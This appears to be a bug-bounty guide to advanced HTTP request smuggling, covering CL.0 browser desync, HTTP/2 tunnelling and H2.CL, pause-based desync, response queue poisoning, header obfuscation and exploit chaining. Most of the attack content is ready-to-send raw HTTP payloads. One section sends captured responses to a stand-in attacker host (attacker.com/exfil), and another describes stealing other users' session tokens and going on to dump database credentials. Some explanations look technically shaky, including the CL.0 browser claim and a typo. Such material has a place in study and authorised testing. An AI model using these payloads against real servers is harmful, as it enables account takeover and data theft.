# Advanced Techniques - Specialized Attacks & Edge Cases

For experienced hunters: advanced exploitation scenarios that don't fit standard templates.

---

## Browser-Powered Desync (CL.0)

### Overview

Client-side desynchronization where **browser ignores Content-Length: 0** but sends body anyway.

**Key insight:** Browser bug/feature that proxies don't account for.

### CL.0 Characteristics

```
Vulnerable architecture:
- Frontend proxy honors CL: 0 → expects no body
- Browser ignores CL: 0 → sends body anyway
- Backend receives unexpected data → second request prefix
```

### CL.0 Attack

```
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Connection: keep-alive

GET /admin HTTP/1.1
Host: target.com

```

**Expected behavior:**
- Proxy reads: CL=0 (body is empty)
- Proxy forwards to backend: same request
- Browser sends: Full GET /admin body
- Backend receives: GET /admin as *prefix* of next request

### CL.0 Targets

Vulnerable to CL.0:
- Single-server sites (less sophisticated parsing)
- VPN portals (strict auth, loose body parsing)
- CDNs (unusual client behavior handling)
- Embedded systems (minimal HTTP parsing)

### Detection

```bash
# Harder to detect via timing (no timeout)
# Requires manual testing

# Test payload:
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Connection: keep-alive

GET /nonexistent-test HTTP/1.1
Host: target.com

# Then normal request on same connection
GET / HTTP/1.1
Host: target.com

# If normal request gets 404 = CL.0 vulnerable
```

### Why Hard to Find

- Timing-based detection doesn't work (no timeout)
- Requires browser simulation
- Browser behavior varies by version
- Often assumed as "client bug" not server vuln

---

## Request Tunnelling (Hide from Frontend)

### Concept

Bypass frontend security checks by making request **invisible to frontend**, only visible to backend.

```
Goal: Backend processes request that frontend proxy doesn't see
Result: Bypass WAF/authentication on frontend
```

### HTTP/2 Tunnelling

**Frontend:** HTTP/2 (multiplexing, streams)
**Backend:** HTTP/1.1 (sequential)

```
Attack: Send multiple HTTP/2 streams on same connection

Stream 1: [Your HTTP/2 framed request]
Stream 2: [Payload that looks like "connection data"]
Stream 3: [Actual smuggled request]

Frontend: Processes as separate streams
Backend (after HTTP/2→HTTP/1.1 downgrade):
  - Interprets streams as sequential
  - Stream 2+3 merge into single HTTP/1.1 request
  - Appears as: Legitimate request with injected prefix
```

### Tunnelling Detection

```bash
# Requires HTTP/2 capable tools: h2load, nghttp2, Burp

h2load -m 1 -n 10 \
  -H "Transfer-Encoding: chunked" \
  https://target.com

# If backend processes differently than HTTP/2 frontend expects:
# = Tunneling vulnerability
```

### Tunnelling Impact

- **Advantage:** Request completely hidden from frontend WAF
- **Disadvantage:** Requires HTTP/2 support
- **Use case:** Bypass WAF rules entirely

---

## Pause-Based Desync

### Concept

Instead of crafting special headers, exploit timing:

1. Send request with incomplete body
2. Pause (leave connection open)
3. Frontend thinks connection idle, sends to backend
4. Backend waits for body completion
5. Send second request on same connection
6. Second request becomes body continuation

### Pause-Based Attack

```
POST /api/data HTTP/1.1
Host: target.com
Content-Length: 200
Connection: keep-alive

[Send only 10 bytes of 200]

[PAUSE 30 seconds]

GET /admin HTTP/1.1
Host: target.com

[Send nothing, let timeout occur]
```

### Timeline

```
T+0s:     POST request sent with CL: 200
T+0.1s:   Frontend forwards to backend
T+0.2s:   Backend waits for 190 more bytes
T+30s:    Attacker sends GET /admin request
T+30.1s:  Backend still thinks it's part of POST body
T+31s:    Backend times out, processes as second request
T+31.1s:  GET /admin processed (desynchronization!)
```

### Detection

Very difficult because:
- Requires timing precision
- Depends on proxy timeout values
- May not show obvious indicators
- Timing delays vary naturally

Not recommended unless timing is extremely precise.

---

## Response Queue Poisoning (Advanced)

### Concept

Queue multiple requests, manipulate response order, capture others' responses.

```
Your Request 1 (slow)
Other User Request (fast, contains credentials)
Your Request 2 (normal)

If response queue isn't FIFO:
Your Request 1 ← gets User's response containing credentials!
```

### Advanced Queue Poisoning

```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

GET / HTTP/1.1
Host: target.com

[Hold connection open, don't send anything]

[Wait for other user to log in on same connection pool]

[Receive: Their login response with session token]
```

### Why It Works

1. Your request queued, waiting for response
2. Backend pool reuses connection for new user
3. User sends POST /login with credentials
4. Backend sends response to oldest queued request = YOUR request!
5. You get user's credentials/session in response

### Detection Requirements

- Must be on actually shared connection pool
- Requires patience (waiting for other users)
- Not automated easily
- Extremely high impact if successful

### Real-World Scenario

```
E-commerce platform with shared connection pool

1. You: POST / (queued, waiting)
2. Other user: POST /login (sent)
3. Backend: Sends /login response to your queued request
4. You receive: {"username":"victim","password":"secret123","token":"xyz"}
5. You: Login as victim
6. Impact: Full account takeover
```

---

## HTTP/2 Specific Attacks

### H2 Smuggling Differences

HTTP/2 uses binary framing, no "chunked" encoding:

```
HTTP/1.1 Chunking:
1a        ← Hex size
[26 bytes of data]
0         ← End marker

HTTP/2 Frames:
[DATA frame with 26-byte payload]
[DATA frame with 0-byte payload = end]

Binary, different semantics entirely
```

### H2.CL (HTTP/2 Content-Length)

**Unique to HTTP/2:** Injected CL field

```
HTTP/2 Request (from browser):
:method: POST
:path: /api
:scheme: https
:authority: example.com
content-length: 13        ← Not normally in HTTP/2!

[HTTP/2 DATA frame: 30 bytes total]
Hello, World!EXTRA_DATA

Frontend (HTTP/2): Sees 30 bytes in frame
Backend (HTTP/1.1 after downgrade):
  Host: example.com
  Content-Length: 13
  [read only 13 bytes]
  EXTRA_DATA → next request prefix
```

### H2 Stream Smuggling

Multiple streams ≠ multiple HTTP/1.1 requests after downgrade:

```
HTTP/2 Streams (parallel):
Stream 1: GET /admin
Stream 2: GET /user
Stream 3: POST /logout

Downgrade to HTTP/1.1:
GET /admin [CRLFCRF]
GET /user [CRLFCRF]  
POST /logout [CRLFCRF]

If response ordering wrong or parsing unexpected:
= Desynchronization
```

---

## Unicode & Encoding Attacks

### Normalization Confusion

Different parsers normalize Unicode differently:

```
Content-Length: 10
vs
Content‐Length: 10  ← Unicode hyphen instead of ASCII hyphen

Frontend: Doesn't recognize second (encoded) version → ignores
Backend: Normalizes Unicode → recognizes CL: 10

Result: Parser disagreement
```

### Case Sensitivity

```
content-length: 10  ← lowercase
Content-Length: 10  ← proper case
CONTENT-LENGTH: 10  ← uppercase

Some parsers case-insensitive
Some parsers case-sensitive
Mismatch = vulnerability
```

### CRLF Injection in Headers

```
Transfer-Encoding: chunked\r\n
Transfer-Encoding: \r\ngzip

Line breaks in header names/values confuse parsers
```

---

## Whitespace Manipulation

### Tab vs Space

```
Transfer-Encoding	: chunked    ← Tab before colon
Transfer-Encoding : chunked     ← Space before colon
Transfer-Encoding: chunked      ← No space (standard)
Transfer-Encoding:chunked       ← No space after

Different parsers handle whitespace differently
```

### Multiline Headers

```
Transfer-Encoding: chunked
  ,gzip                          ← Continuation on next line
  
Some parsers: Accept (multiline header)
Some parsers: Reject (invalid)
Mismatch = vulnerability
```

### Trailing Whitespace

```
Content-Length: 13   
                     ← Trailing spaces before CRLF
                     
Some parsers: Include whitespace in value
Some parsers: Strip whitespace
Result: Different CL interpretation
```

---

## Smuggling in Request Headers vs Body

### Header-Based Smuggling

```
Regular CL.TE attack (in body)
Regular TE.CL attack (in body)

Header-based: Injection in header parsing itself
```

Example:

```
GET /api HTTP/1.1
Host: target.com
X-Custom-Header: value
Content-Length: 
 13              ← CL split across lines (header continuation)

[body with 13 bytes]
```

### Response Headers Smuggling

Poisoning response headers to trick next request:

```
Response 1:
Content-Length: 13
Set-Cookie: session=abc

[13 bytes of body]
[Excess data that becomes Response 2 header]

Result: Response 2 sees corrupted headers
```

---

## Desync in Proxies Only (No Backend Vuln)

### Proxy-to-Proxy Attacks

Sometimes desync occurs between proxies, not proxy-to-backend:

```
Client → Proxy1 (CloudFlare) → Proxy2 (internal) → Backend

Desync between Proxy1 and Proxy2 (not with backend)
= Still exploitable, but different attack surface
```

### Detection

```
If CL.TE works but only with:
- Specific proxy configuration
- Specific request patterns
- Specific timing

= Likely proxy-to-proxy desync, not backend desync
```

---

## Blind Exploitation (No Response Visible)

### Burp Collaborator Integration

When responses are delayed or not visible:

```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

0

GET /internal/api HTTP/1.1
Host: attacker.burpcollaborator.net

[Force response to external domain you control]
```

**Result:**
- Target makes request to your server
- You see the request in Burp Collaborator
- Proves backend processed smuggled request

### External Server Exfiltration

```
Smuggled request:
GET /api/users HTTP/1.1
Host: target.com

[Response comes back to next request on socket]

If you can't see it directly:
Create request that POSTs response to your server:

POST https://attacker.com/exfil HTTP/1.1
[POST body contains response you captured]
```

---

## Exploit Chaining

### Multi-Stage Attacks

Single smuggle → multiple exploits:

```
Stage 1: Smuggle request to discover internal endpoints
→ Find: /admin, /api, /internal/config

Stage 2: Smuggle admin access request
→ Get: Admin dashboard

Stage 3: Smuggle admin API call
→ Extract: Database credentials

Stage 4: Connect to database
→ Dump: User data, secrets, etc.
```

Each stage uses discovery from previous stage.

### Automation Opportunities

Once one smuggle confirmed:

```
FOR each discovered endpoint:
  FOR each HTTP method:
    FOR each known parameter:
      Smuggle request with different payload
      
Goal: Map all exploitable endpoints
```

---

## Timing Precision Attacks

### Sub-millisecond Timing

Some platforms are sensitive to exact timing:

```
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

[Wait exactly 100ms]
1
[Wait exactly 50ms]
A
[Wait exactly 75ms]
0
```

Precision timing can:
- Bypass time-based WAF rules
- Trigger specific backend behavior
- Confuse connection timeout logic

Not commonly needed but available for edge cases.

---

## When to Use Advanced Techniques

```
CL.TE/TE.CL    ← Try first (90% of cases)
TE.TE variants ← Try second (8% of cases)
H2 specific    ← If HTTP/2 confirmed
Browser desync ← If single-server architecture
Response queue ← If credential theft needed
Tunneling      ← To bypass WAF completely
Timing attacks ← As last resort when timing critical
```

Advanced techniques used in ~2% of targets but yield highest bounties ($50K+).

